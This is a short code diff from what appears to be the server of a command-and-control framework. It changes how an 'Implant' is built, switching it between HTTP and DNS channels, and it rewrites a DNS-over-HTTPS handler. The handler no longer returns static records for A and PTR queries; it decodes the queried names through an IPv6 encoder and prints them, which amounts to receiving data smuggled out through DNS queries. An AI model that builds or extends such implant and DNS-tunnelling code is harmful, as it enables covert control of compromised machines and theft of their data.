@@ -57,17 +57,6 @@ logging.basicConfig(
 )
 
 
-DOMAIN_TO_IP = {
-    "example.com.": "192.168.1.100",
-    "test.com.": "192.168.1.101"
-}
-
-IP_TO_HOSTNAME = {
-    "100.1.168.192.in-addr.arpa.": "example.com.",
-    "101.1.168.192.in-addr.arpa.": "test.com."
-}
-
-
 # Load the default config file
 with open('s_conf.json', 'r') as file:
     config = json.load(file)
@@ -166,7 +155,7 @@ def build_implant(protocol):
         case "http":
             try:
                 result = subprocess.run(
-                    ["make build METHOD=withHttp"],
+                    ["make build EN_DNS=false"],
                     cwd='../Implant',
                     check=True,
                     capture_output=True,
@@ -186,7 +175,7 @@ def build_implant(protocol):
         case "dns":
             try:
                 result = subprocess.run(
-                    ["make build METHOD=withDns"],
+                    ["make build EN_DNS=true"],
                     cwd='../Implant',
                     check=True,
                     capture_output=True,
@@ -594,22 +583,10 @@ def doh_handler():
 
     if qtype == "PTR":
         # Handle reverse DNS (PTR) query
-        if str(qname) in IP_TO_HOSTNAME:
-            hostname = IP_TO_HOSTNAME[str(qname)]
-            response_packet.add_answer(
-                RR(rname=qname, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(hostname))
-            )
-        else:
-            response_packet.header.rcode = RCODE.NXDOMAIN  # No such domain
+        print(ipv6_encoder.ipv6_to_string(qname))
     elif qtype == "A":
         # Handle standard DNS (A) query
-        if str(qname) in DOMAIN_TO_IP:
-            ip_address = DOMAIN_TO_IP[str(qname)]
-            response_packet.add_answer(
-                RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=300, rdata=A(ip_address))
-            )
-        else:
-            response_packet.header.rcode = RCODE.NXDOMAIN  # No such domain
+        print(ipv6_encoder.ipv6_to_string(qname))
     else:
         # Unsupported query type
         response_packet.header.rcode = RCODE.NOTIMP  # Not implemented
